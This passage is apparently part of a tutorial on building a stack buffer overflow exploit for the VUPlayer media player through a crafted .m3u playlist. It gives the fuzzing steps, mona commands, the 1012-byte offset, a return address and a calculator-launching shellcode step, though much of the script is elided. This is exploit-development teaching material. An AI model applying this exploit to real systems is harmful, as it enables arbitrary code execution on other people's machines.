...
---
Write the base python script for the exploitation process and name it as vup_exploit.py
...
f.close()
```
This Script line will generate a \x41 pattern adding the \x41 desired amount. You can try with a different length, if its needed
```python
...
In VUPlayer add the evil.m3u to a new playlist.

As we can see, the pattern of \ x41 exceeds the buffer limit. Good news! we have created an overflow in the stack!
Continue creating a folder for the logs in your drive using this mona command in the immunity debugger.

```python
!mona config -set workingfolder c:\logs\%p
```
check the output in Immunity logs window.
```sh
Log data, item 2
 Address=0BADF00D
 Message=New value of parameter workingfolder =  c:\logs\%p
```
Let´s create a pattern of same length as your /x41 pattern in the debugger, in this case 1500. Write the next mona command:
```python
...
on immunity debbuger press Ctrl+F2 (restart) and F9(Run), and open evil.m3u file in VUPlayer

Now let´s check the offset with this mona command:
```python
...
```
Now we are ready! and we know the exact amount of space (1012 bytes) available on the stack, we will check now if everything is fine by adding 4 "B" to overwrite the returning address.
```python
...
```
Run the script and check if the EIP register is filled with the \x42\x42\x42\x42 (BBBB).
```sh
EAX 00000000
ECX 41414141
EDX 00000000
...
```
Restart VUPlayer debugging process again, and check using Go to Expresion (Ctrl+G) ESP to find out what is happening. Its seems that everything is working fine!
```sh
0019E714  01 02 03 04 05 06 07 08 00 E8 19 00 BC 53 54 02  .è.¼ST
```
Now it's time to create a new byte array without the null \x00. The second mona command compare the two byte arrays for us.
...
!mona jmp -r esp
```
Check and choose your desired address flagged with ASLR: False
...
```
Copy the return address 0x100222c5 and paste on the script (remeber the little endian) with your favorite shell code flavour, and...
...
f.close()
```
The final script will launch a shell that opens a windows calculator program!
Is it time to learn some maths?
